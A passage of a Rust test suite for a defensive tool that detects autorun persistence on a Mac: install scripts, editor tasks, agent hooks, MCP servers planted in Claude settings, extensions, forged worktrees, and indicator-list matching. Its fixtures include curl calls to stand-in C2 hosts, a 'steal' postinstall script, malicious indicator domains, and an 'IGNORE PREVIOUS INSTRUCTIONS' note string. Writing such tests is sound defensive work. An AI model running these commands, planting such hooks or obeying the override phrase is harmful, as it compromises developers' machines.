    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/tree (1)"]);
    e.seen();
    put(&tree.join(".git/hooks/post-merge"), "#!/bin/sh\n");
    e.run();
    assert_eq!(
        e.found(),
        [pair("watched.git-hook", "~/dev/tree/.git/hooks/post-merge")]
    );
}

/// An agent's session that worked in these folders.
fn session(e: &Estate, name: &str, cwd: &Path) {
    put(
        &e.0.join(format!("sessions/{name}/session.jsonl")),
        &format!("{}\n", serde_json::json!({ "cwd": cwd })),
    );
}

#[test]
fn a_project_reached_only_through_agents_sessions_is_silent_at_the_first_check_and_told_once_later()
{
    // Agents work in folders the walk of the home folder never lists. A project their sessions
    // lead to at the first check is the silent baseline. Sessions name folders and do not list
    // them, so one an agent starts in later cannot be shown to be new: it is told once, and no
    // rule raises it.
    let e = Estate::new("agents-later");
    let old = e.0.join("elsewhere/old");
    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&old, "\"preinstall\": \"node x.js\"");
    session(&e, "old", &old);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    let new = e.0.join("elsewhere/new");
    put(&new.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&new, "\"preinstall\": \"node x.js\"");
    session(&e, "new", &new);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    let told = e.told();
    assert_eq!(told.len(), 1, "{told:?}");
    assert!(told[0].ends_with("/elsewhere/new (1)"), "{told:?}");
}

#[test]
fn a_project_in_a_folder_the_walk_skips_is_told_once_when_agents_sessions_are_first_read() {
    // The sessions could not be read at the first check. The walk went through the home
    // folder but not into its hidden folders, so a project there that the sessions lead to
    // later was never looked at: what it holds is told once and kept as its baseline.
    let e = Estate::new("agents-hidden");
    let hidden = e.home().join(".tools/helper");
    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&hidden, "\"preinstall\": \"node x.js\"");
    put(&e.0.join("sessions"), "not a folder\n");
    e.run_with(&e.home(), &e.0.join("sessions"));
    std::fs::remove_file(e.0.join("sessions")).unwrap();
    session(&e, "helper", &hidden);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/.tools/helper (1)"]);
    assert!(
        !e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live'
               AND subject LIKE '%.tools/helper/package.json#/scripts/preinstall'"
        )
        .is_empty()
    );
}

#[test]
fn a_place_a_newer_version_reads_for_the_first_time_is_told_once_and_a_change_after_is_found() {
    // A new row in a kind of place the store has read for long: what it holds at its first
    // reading is told once and raised by no rule, and a change in it after that is found.
    let e = Estate::new("new-place");
    put(&e.home().join(".zshrc"), "export A=1\n");
    put(&e.home().join(".bash_login"), "export B=1\n");
    e.run();
    // As a version that did not read ~/.bash_login left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE subject LIKE '%/.bash_login' OR scope LIKE '%/.bash_login';
         DELETE FROM coverage WHERE scope LIKE '%/.bash_login';
         DELETE FROM unit_read WHERE unit = '.bash_login';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["file:machine:mac/.bash_login (1)"]);
    e.seen();
    put(&e.home().join(".bash_login"), "export B=2\n");
    e.run();
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.bash_login")]);
}

#[test]
fn every_known_way_is_on_the_page_and_the_limit_says_the_numbers_of_that_table() {
    // A way the program does not read is never silent: present or not, it is on the page,
    // and the one item of what is not covered counts the same table.
    let e = Estate::new("ways");
    for rel in ["dev/a", "dev/b"] {
        let c = e.checkout(rel);
        put(&c.join(".envrc"), "use flake\n");
        package(&c, "");
    }
    put(&e.checkout("dev/c").join("bunfig.toml"), "preload = []\n");
    e.run();
    let page = e.this_mac_page();
    let start = page.find("<section id=\"ways-code-runs\">").unwrap();
    let section = &page[start..start + page[start..].find("</section>").unwrap()];
    let rows: Vec<Vec<&str>> = section
        .split("<tr>")
        .skip(2)
        .map(|row| {
            row.split("<td")
                .skip(1)
                .map(|cell| &cell[cell.find('>').unwrap() + 1..cell.find("</td>").unwrap()])
                .collect()
        })
        .collect();
    let read = rows.iter().filter(|r| r[3].starts_with("Read")).count();
    let not_read = rows.iter().filter(|r| r[3] == "Not read").count();
    assert_eq!(read + not_read, rows.len());
    let here: Vec<(&str, &str)> = rows
        .iter()
        .filter(|r| r[4] != "0" && r[4] != "Not looked for")
        .map(|r| (r[0], r[4]))
        .collect();
    assert_eq!(
        here,
        [("package.json", "2"), ("bunfig.toml", "1"), (".envrc", "2")]
    );
    let present = rows
        .iter()
        .filter(|r| r[3] == "Not read" && r[4] != "0" && r[4] != "Not looked for")
        .count();
    assert_eq!(present, 2);

    let item = |r: &serde_json::Value| {
        r["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .find(|u| u["id"] == "project-autorun")
            .unwrap()
            .clone()
    };
    let u = item(&e.status());
    assert_eq!(
        u["title"],
        format!(
            "This version reads {read} of the {} known ways a project can make code run by itself.",
            rows.len()
        )
    );
    assert_eq!(
        u["meaning"],
        format!(
            "{present} of the others are present in your projects and are not read, so a change in them would go unseen."
        )
    );
    assert_eq!(
        (&u["who"], &u["count"]),
        (&"nothing".into(), &present.into())
    );
    // The status's item of what it does not understand no longer names them.
    assert!(
        e.status()["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .all(|u| u["id"] != "not-understood")
    );
    for c in ["dev/a", "dev/c"] {
        std::fs::remove_dir_all(e.home().join(c)).unwrap();
    }
    std::fs::remove_file(e.home().join("dev/b/.envrc")).unwrap();
    e.run();
    assert_eq!(
        item(&e.status())["meaning"],
        "None of the others is present in your projects now."
    );
}

// The home folder: a developer tool's own settings.

/// Claude Code's state file as it rewrites it, with servers of one project and these more of
/// the user's.
fn state(e: &Estate, starts: u32, project: &str) {
    put(
        &e.home().join(".claude.json"),
        &format!(
            "{{\"numStartups\": {starts}, \"tipsHistory\": {{\"a\": {starts}}}, \"mcpServers\": {{}},
              \"projects\": {{\"/invented/shop\": {{\"allowedTools\": [], \"history\": [{starts}],
                \"mcpServers\": {{{project}}}}}}}}}"
        ),
    );
}

const DESKTOP: &str = "Library/Application Support/Claude/claude_desktop_config.json";

#[test]
fn a_planted_tool_in_an_agents_own_settings_is_a_finding_and_an_edit_elsewhere_in_that_file_is_not()
{
    // How malware made agents run its code in every project: its own server added to the
    // agent's settings in the home folder. Claude Code rewrites its state file all the time;
    // only the servers in it are read, so its rewrites are nothing to find.
    let e = Estate::new("home-agents");
    state(&e, 1, "");
    put(&e.home().join(DESKTOP), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert_eq!(
        e.coverage("~/.claude.json, the part that runs by itself"),
        "full|none of the keys read is in ~/.claude.json"
    );

    state(&e, 2, "");
    put(
        &e.home().join(DESKTOP),
        "{\"mcpServers\": {}, \"globalShortcut\": \"Cmd+Space\"}",
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    state(
        &e,
        3,
        "\"helper\": {\"command\": \"node\", \"args\": [\".invented/x.js\"]}",
    );
    put(
        &e.home().join(DESKTOP),
        "{\"mcpServers\": {\"helper\": {\"command\": \"node\"}}}",
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-settings",
                "~/.claude.json#/projects/~1invented~1shop/mcpServers/helper"
            ),
            pair(
                "autorun.agent-settings",
                &format!("~/{DESKTOP}#/mcpServers/helper")
            ),
        ]
    );
}

/// An extension's folder as VS Code names it, holding its manifest.
fn extension(e: &Estate, folder: &str) {
    put(
        &e.home()
            .join(".vscode/extensions")
            .join(folder)
            .join("package.json"),
        "{}",
    );
}

#[test]
fn an_extensions_new_version_is_not_a_finding_and_a_new_extension_or_a_new_publisher_is() {
    // The editor updates its extensions by itself: a new version is a new folder, and the old
    // one goes. Only what identifies an extension apart from its version is watched.
    let e = Estate::new("extensions");
    let folder = e.home().join(".vscode/extensions");
    extension(&e, "ms-python.python-2024.2.1-darwin-arm64");
    extension(&e, "esbenp.prettier-vscode-10.1.0");
    put(&folder.join("extensions.json"), "[]");
    put(&folder.join(".obsolete"), "{}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    std::fs::remove_dir_all(folder.join("ms-python.python-2024.2.1-darwin-arm64")).unwrap();
    extension(&e, "ms-python.python-2024.4.0-darwin-arm64");
    extension(&e, "esbenp.prettier-vscode-11.0.0");
    std::fs::create_dir_all(folder.join(".4a1b2c3d-extracting")).unwrap();
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    extension(&e, "esbemp.prettier-vscode-11.0.0");
    extension(&e, "invented.helper-0.0.1");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.editor-extension",
                "~/.vscode/extensions/esbemp.prettier-vscode"
            ),
            pair(
                "autorun.editor-extension",
                "~/.vscode/extensions/invented.helper"
            ),
        ]
    );
}

#[test]
fn a_place_in_the_home_folder_read_for_the_first_time_on_an_existing_store_is_told_once() {
    // A store of an earlier build never read the home folder's settings: what they hold the
    // first time is told once, not a finding about every server and extension.
    let e = Estate::new("home-upgrade");
    state(&e, 1, "\"helper\": {\"command\": \"node\"}");
    put(
        &e.home().join(".gemini/settings.json"),
        "{\n  // mine\n  \"mcpServers\": {\"x\": {\"command\": \"npx\"}}\n}",
    );
    extension(&e, "esbenp.prettier-vscode-10.1.0");
    e.run();
    // As an earlier build left it: no reading of these kinds, nothing they asserted.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage
           WHERE kind LIKE '~/%' OR kind LIKE 'other places in the home folder%'
              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%');
         DELETE FROM assertion WHERE kind LIKE '~/%' OR scope LIKE '%#/%'
              OR scope LIKE '%/.vscode/extensions/%';
         DELETE FROM coverage WHERE kind LIKE '~/%' OR kind LIKE 'other places in the home folder%'
              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%';
         DELETE FROM unit_read WHERE kind LIKE '~/%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(
        e.told(),
        [
            "file:machine:mac/.claude.json (1)",
            "file:machine:mac/.gemini/settings.json (1)",
            "file:machine:mac/.vscode/extensions (1)"
        ]
    );
    e.seen();
    extension(&e, "invented.helper-0.0.1");
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-extension",
            "~/.vscode/extensions/invented.helper"
        )]
    );
}

#[test]
fn the_home_items_numbers_equal_the_pages_table_of_places() {
    // A place the program does not read is never silent: present or not, it is on the page,
    // and the one item of what is not covered counts the same table.
    let e = Estate::new("home-places");
    put(&e.home().join(".codex/config.toml"), "model = \"x\"\n");
    put(&e.home().join(".claude/skills/a/SKILL.md"), "x\n");
    put(&e.home().join(".gemini/settings.json"), "{}");
    e.run();
    let page = e.this_mac_page();
    let start = page.find("<section id=\"home-code-runs\">").unwrap();
    let section = &page[start..start + page[start..].find("</section>").unwrap()];
    let rows: Vec<Vec<&str>> = section
        .split("<tr>")
        .skip(2)
        .map(|row| {
            row.split("<td")
                .skip(1)
                .map(|cell| &cell[cell.find('>').unwrap() + 1..cell.find("</td>").unwrap()])
                .collect()
        })
        .collect();
    let read = rows.iter().filter(|r| r[3].starts_with("Read")).count();
    let here: Vec<(&str, &str)> = rows
        .iter()
        .filter(|r| r[4] == "Yes")
        .map(|r| (r[0], r[3]))
        .collect();
    assert_eq!(
        here,
        [
            ("~/.gemini/settings.json", "Read"),
            (
                "~/.claude/skills, ~/.claude/commands, ~/.claude/agents",
                "Not read"
            ),
            ("~/.codex/config.toml", "Not read"),
        ]
    );
    assert!(rows.iter().all(|r| r[4] == "Yes" || r[4] == "No"));
    let present = here.iter().filter(|r| r.1 == "Not read").count();
    let item = |r: &serde_json::Value| {
        r["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .find(|u| u["id"] == "home-autorun")
            .unwrap()
            .clone()
    };
    let u = item(&e.status());
    assert_eq!(
        u["title"],
        format!(
            "This version reads {read} of the {} known places where a developer tool's own settings can make code run by itself.",
            rows.len()
        )
    );
    assert_eq!(
        u["meaning"],
        format!(
            "{present} of the others are present on this Mac and are not read, so a change in them would go unseen."
        )
    );
    assert_eq!(
        (&u["who"], &u["count"]),
        (&"nothing".into(), &present.into())
    );
    assert!(
        e.status()["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .all(|u| u["id"] != "not-understood")
    );
    std::fs::remove_dir_all(e.home().join(".codex")).unwrap();
    std::fs::remove_dir_all(e.home().join(".claude")).unwrap();
    e.run();
    assert_eq!(
        item(&e.status())["meaning"],
        "None of the others is present on this Mac now."
    );
}

// Worktrees of a project the store holds.

/// A linked worktree of the checkout `main` at `rel`, as `git worktree add` leaves it: its
/// `.git` file points into the repository's folder of worktrees, whose `gitdir` points back
/// and whose `commondir` names the repository's folder.
fn worktree(e: &Estate, main: &Path, rel: &str) -> PathBuf {
    let path = e.home().join(rel);
    let own = main.join(".git/worktrees").join(path.file_name().unwrap());
    put(&path.join(".git"), &format!("gitdir: {}\n", own.display()));
    put(
        &own.join("gitdir"),
        &format!("{}\n", path.join(".git").display()),
    );
    put(&own.join("commondir"), "../..\n");
    put(&own.join("HEAD"), "ref: refs/heads/feature\n");
    path
}

/// The journal's entries for places that raised nothing for being the same as in another
/// checkout, as subject and the checkout they are the same as.
fn same_as(e: &Estate) -> Vec<String> {
    e.rows(
        "SELECT subject, json_extract(text, '$.checkout') FROM journal
         WHERE entry = 'same_as_sibling' ORDER BY subject",
    )
}

#[test]
fn a_worktree_of_a_known_project_with_the_same_agent_settings_raises_nothing_and_the_journal_says_where_it_is_the_same()
 {
    // Agents make a worktree of a project all day; its settings are the project's own, byte
    // for byte, and run nothing the project does not. An alarm for each would teach the owner
    // to ignore the alarm. A finding that stands in the project stands alone.
    let e = Estate::new("worktree-same");
    let shop = e.checkout("dev/shop");
    agent(&shop, "");
    e.run();
    agent(&shop, HOOK);
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/dev/shop/.claude/settings.json#/hooks"
        )]
    );
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, HOOK);
    let said = e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/dev/shop/.claude/settings.json#/hooks"
        )]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-feature/.claude/settings.json#/hooks|checkout:machine:mac/dev/shop"
        ]
    );
    assert!(said.contains("the same as in dev/shop"), "{said}");
    // Recorded as any place is, with the part that counts the journal says is the same.
    let content = |like: &str| {
        e.rows(&format!(
            "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
               AND subject LIKE '%{like}'"
        ))
    };
    let project = content("dev/shop/.claude/settings.json#/hooks");
    assert_eq!(project.len(), 1);
    assert_eq!(
        content("shop-feature/.claude/settings.json#/hooks"),
        project
    );
    assert_eq!(
        e.rows("SELECT new_value FROM journal WHERE entry = 'same_as_sibling'"),
        project
    );
}

#[test]
fn a_later_change_in_a_worktrees_place_that_raised_nothing_is_a_finding_like_any_change() {
    // Only the worktree's first appearance is judged against its project. After it, a place
    // that changes or appears in it is a finding as in any checkout, even the same as the
    // project's.
    let e = Estate::new("worktree-later");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    e.run();
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, HOOK);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    agent(&tree, &HOOK.replace("start-91c2", "start-0b7e"));
    package(&tree, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.package-install",
                "~/dev/shop-feature/package.json#/scripts/postinstall"
            ),
        ]
    );
}

#[test]
fn a_worktree_whose_part_that_counts_differs_from_its_projects_raises_the_finding() {
    // Equal is per place and per part: what the project does not run is new, wherever its
    // neighbours in the same file are the same. The same part in a project of another
    // repository counts for nothing.
    let e = Estate::new("worktree-differs");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    let web = e.checkout("dev/web");
    agent(&web, &HOOK.replace("start-91c2", "start-0b7e"));
    put(&web.join(".mcp.json"), SERVER);
    e.run();
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, &HOOK.replace("start-91c2", "start-0b7e"));
    package(&tree, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&tree.join(".mcp.json"), SERVER);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.mcp.json#/mcpServers/helper"
            ),
        ]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-feature/package.json#/scripts/postinstall|checkout:machine:mac/dev/shop"
        ]
    );
}

#[test]
fn a_separate_clone_with_byte_identical_settings_still_raises_the_finding() {
    // A fresh clone with something that runs by itself is the attack this program is for. The
    // same bytes in another repository, of the same name or from the same remote, prove
    // nothing.
    let e = Estate::new("clone-same");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    put(
        &shop.join(".git/config"),
        "[remote \"origin\"]\n\turl = https://git.example.invalid/shop.git\n",
    );
    e.run();
    let clone = e.checkout("work/shop");
    agent(&clone, HOOK);
    put(
        &clone.join(".git/config"),
        "[remote \"origin\"]\n\turl = https://git.example.invalid/shop.git\n",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/work/shop/.claude/settings.json#/hooks"
        )]
    );
    assert!(same_as(&e).is_empty());
}

#[test]
fn a_folder_that_claims_to_be_a_worktree_without_the_projects_pointer_back_still_raises_the_finding()
 {
    // The `.git` file of a folder is text anyone who writes in it can write. It is believed
    // only when the project's own git folder points back at it.
    let e = Estate::new("worktree-forged");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    e.run();
    // A worktree that is real, so that its folder in the project's git folder exists.
    let real = worktree(&e, &shop, "dev/shop-feature");
    agent(&real, HOOK);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    // Points at a folder of worktrees that does not exist.
    let none = e.home().join("dev/none");
    put(
        &none.join(".git"),
        &format!("gitdir: {}\n", shop.join(".git/worktrees/none").display()),
    );
    agent(&none, HOOK);
    // Points at the real worktree's folder, which points back at the real worktree: a copy.
    let copy = e.home().join("dev/copy");
    put(
        &copy.join(".git"),
        &format!(
            "gitdir: {}\n",
            shop.join(".git/worktrees/shop-feature").display()
        ),
    );
    agent(&copy, HOOK);
    // Keeps every pointer, back included, in a folder of its own outside the project's git
    // folder.
    let forged = e.home().join("dev/forged");
    let own = forged.join(".pointers/forged");
    put(
        &forged.join(".git"),
        &format!("gitdir: {}\n", own.display()),
    );
    put(
        &own.join("gitdir"),
        &format!("{}\n", forged.join(".git").display()),
    );
    put(
        &own.join("commondir"),
        &format!("{}\n", shop.join(".git").display()),
    );
    agent(&forged, HOOK);
    // Its `.git` is a link to the project's git folder: no worktree git made.
    let linked = e.home().join("dev/linked");
    std::fs::create_dir_all(&linked).unwrap();
    std::os::unix::fs::symlink(shop.join(".git"), linked.join(".git")).unwrap();
    agent(&linked, HOOK);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/copy/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/forged/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/linked/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/none/.claude/settings.json#/hooks"
            ),
        ]
    );
}

#[test]
fn a_worktree_an_agent_keeps_inside_its_project_is_judged_by_the_path_of_a_place_in_the_worktree() {
    // Agents keep their worktrees inside the project's own folder, where only their sessions
    // lead. A place there belongs to the worktree, the deepest checkout that holds it, and is
    // compared with the project's place of the same path from its own checkout.
    let e = Estate::new("worktree-inside");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    e.run();
    let tree = worktree(&e, &shop, "dev/shop/.claude/worktrees/fix");
    agent(&tree, HOOK);
    let sessions = e.0.join("sessions/fix");
    put(
        &sessions.join("session.jsonl"),
        &format!("{}\n", serde_json::json!({ "cwd": tree })),
    );
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop/.claude/worktrees/fix/.claude/settings.json#/hooks|checkout:machine:mac/dev/shop"
        ]
    );
}

#[test]
fn an_install_script_and_an_editor_task_in_a_worktree_are_judged_as_agent_settings_are() {
    // The comparison is of every place read in a checkout, not of one tool's file.
    let e = Estate::new("worktree-general");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&shop.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    let same = worktree(&e, &shop, "dev/shop-same");
    package(&same, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&same.join(".vscode/tasks.json"), ON_OPEN);
    let other = worktree(&e, &shop, "dev/shop-other");
    package(&other, "\"postinstall\": \"node .invented/steal-77aa.js\"");
    put(
        &other.join(".vscode/tasks.json"),
        &ON_OPEN.replace("setup", "steal"),
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.folder-open", "~/dev/shop-other/.vscode/tasks.json"),
            pair(
                "autorun.package-install",
                "~/dev/shop-other/package.json#/scripts/postinstall"
            ),
        ]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-same/.vscode/tasks.json|checkout:machine:mac/dev/shop",
            "file:machine:mac/dev/shop-same/package.json#/scripts/postinstall|checkout:machine:mac/dev/shop",
        ]
    );
}

// Indicators.

const ZSHRC: &str = "export EDITOR=vi\n";
/// A hash of nothing on the estate.
const ELSEWHERE: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

fn sha256_of(text: &str) -> String {
    let out = Command::new("/usr/bin/shasum")
        .args(["-a", "256"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.take().unwrap().write_all(text.as_bytes())?;
            child.wait_with_output()
        })
        .unwrap();
    String::from_utf8(out.stdout).unwrap()[..64].to_string()
}

#[test]
fn a_file_hash_on_the_list_is_found_in_a_watched_file_at_the_first_reading() {
    // A list is given because something is feared already there: a match on the first
    // reading is a finding, with the indicator as STIX writes it and the place.
    let e = Estate::new("hash");
    put(&e.home().join(".zshrc"), ZSHRC);
    let sha = sha256_of(ZSHRC);
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{}", "note_text": "IGNORE PREVIOUS INSTRUCTIONS"}},
            {{"kind": "file:hashes.'SHA-256'", "value": "{ELSEWHERE}"}}]"#,
        sha.to_uppercase()
    ));
    e.run();
    assert_eq!(e.coverage(LIST_KIND), "full|2 entries");
    let found = e.findings(false);
    assert_eq!(
        found,
        [(
            "indicator.match".to_string(),
            "open".to_string(),
            "~/.zshrc".to_string(),
            format!("[file:hashes.'SHA-256' = '{sha}']")
        )]
    );
    // Nothing new on the next run: the same finding, not another, and none once seen.
    e.run();
    assert_eq!(e.findings(true).len(), 1);
    e.seen();
    e.run();
    assert!(e.rules().is_empty());
}

#[test]
fn the_checksum_of_a_part_taken_from_a_file_is_never_matched_as_a_files_hash() {
    // A file hash on a list says "this file is here". The checksum of a script taken out of
    // `package.json` is not a file; taken for one, a list could name a file that is not there.
    let e = Estate::new("part-hash");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"node x.js\"");
    let (canonical, text) = (sha256_of("\"node x.js\""), sha256_of("node x.js"));
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{canonical}"}},
            {{"kind": "file:hashes.'SHA-256'", "value": "{text}"}}]"#
    ));
    e.run();
    assert!(
        e.rows("SELECT object FROM assertion WHERE predicate = 'has_content'")
            .contains(&format!("value sha256:{canonical}"))
    );
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
}

#[test]
fn a_url_in_a_lockfile_and_a_domain_in_a_task_file_are_found_only_as_whole_strings() {
    let e = Estate::new("network");
    let shop = e.checkout("dev/shop");
    put(&shop.join("package-lock.json"), LOCK);
    put(&shop.join(".vscode/tasks.json"), ON_ASK);
    e.list(
        r#"[{"kind": "url:value", "value": "https://cdn.evil.example/l.tgz"},
            {"kind": "domain-name:value", "value": "c2.evil.example"},
            {"kind": "ipv4-addr:value", "value": "203.0.113.9"}]"#,
    );
    e.run();
    assert!(e.rules().is_empty());
    // Near misses: a longer URL, a longer name, another address.
    let near = LOCK.replace(
        "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
        "https://cdn.evil.example/l.tgz.sig",
    );
    put(&shop.join("package-lock.json"), &near);
    put(
        &shop.join(".vscode/tasks.json"),
        &ON_ASK.replace("make", "curl c2.evil.example.org 203.0.113.90"),
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &shop.join("package-lock.json"),
        &near.replace(".tgz.sig", ".tgz"),
    );
    put(
        &shop.join(".vscode/tasks.json"),
        &ON_ASK.replace("make", "curl https://C2.Evil.Example/x"),
    );
    e.run();
    let mut found: Vec<(String, String)> =
        e.findings(false).into_iter().map(|f| (f.2, f.3)).collect();
    found.sort();
    assert_eq!(
        found,
        [
            (
                "~/dev/shop/.vscode/tasks.json".to_string(),
                "[domain-name:value = 'c2.evil.example']".to_string()
            ),
            (
                "~/dev/shop/package-lock.json".to_string(),
                "[url:value = 'https://cdn.evil.example/l.tgz']".to_string()
            ),
        ]
    );
}

#[test]
fn a_list_out_of_shape_fails_and_the_list_read_before_is_still_matched() {
    let e = Estate::new("malformed");
    let shop = e.checkout("dev/shop");
    put(&shop.join("package-lock.json"), LOCK);
    e.list(r#"[{"kind": "domain-name:value", "value": "evil.example"}]"#);
    e.run();
    e.list(r#"[{"kind": "domain-name:value", "value": "not a name"}]"#);
    e.run();
    assert_eq!(
        e.coverage(LIST_KIND),
        "none|entry 1: not a domain name in ASCII; the list read before is matched"
    );
    put(
        &shop.join("package-lock.json"),
        &LOCK.replace("registry.npmjs.org", "evil.example"),
    );
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
}

#[test]
fn a_first_list_out_of_shape_fails_and_matches_nothing() {
    let e = Estate::new("first-malformed");
    e.checkout("dev/shop");
    e.list("not json");
    e.run();
    let coverage = e.coverage(LIST_KIND);
    assert!(
        coverage.starts_with("none|not JSON") && coverage.ends_with("; no list was read before"),
        "{coverage}"
    );
    assert!(e
        .rows("SELECT 1 FROM coverage WHERE reader = 'indicators' AND kind != 'indicator list given as a file'")
        .is_empty());
}

#[test]
fn an_indicator_taken_off_the_list_leaves_its_finding_open_for_the_owner() {
    let e = Estate::new("taken-off");
    let shop = e.checkout("dev/shop");
    put(
        &shop.join("package-lock.json"),
        &LOCK.replace("registry.npmjs.org", "evil.example"),
    );
    e.list(r#"[{"kind": "domain-name:value", "value": "evil.example"}]"#);
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
    e.list("[]");
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
    assert!(
        e.rows("SELECT 1 FROM assertion WHERE layer = 'live' AND predicate = 'matches_indicator'")
            .is_empty()
    );
}

#[test]
fn what_an_indicator_is_not_matched_against_is_named_never_answered_as_no_match() {
    // A block of addresses and a file name have no matcher: both are said by name, so silence
    // is never read as "not here". One address is matched against what samples see.
    let e = Estate::new("unmatched");
    e.list(
        r#"[{"kind": "ipv4-addr:value", "value": "203.0.113.9"},
            {"kind": "ipv4-addr:value", "value": "203.0.113.0/24"},
            {"kind": "file:name", "value": "loader.js"}]"#,
    );
    e.run();
    assert_eq!(
        e.coverage(UNMATCHED_KIND),
        "none|not matched: file:name; ipv4-addr:value given as a CIDR block"
    );
    assert_eq!(
        e.lacks(UNMATCHED_KIND),
        [
            "indicator kind with no matcher|file:name",
            "indicator kind with no matcher|ipv4-addr:value given as a CIDR block",
        ]
    );
}

#[test]
fn without_a_list_nothing_of_indicators_is_read_or_written() {
    let e = Estate::new("no-list");
    e.checkout("dev/shop");
    e.run();
    assert!(
        e.rows("SELECT 1 FROM coverage WHERE reader = 'indicators'")
            .is_empty()
    );
}

// A change, the baseline, or read for the first time (`baseline.rs`). Each of the next tests
// began as a probe of a review; its name says the promise.

#[test]
fn a_clone_made_after_the_first_check_whose_file_fails_at_first_is_found_once_the_file_reads() {
    // A clone's task file is a link to a file the clone does not hold; the next pull makes it
    // a task file. The clone was made after the first check, so what it holds is new, read at
    // once or later.
    let e = Estate::new("clone-fails-first");
    let old = e.checkout("dev/old");
    package(&old, "\"postinstall\": \"node setup.js\"");
    e.run();
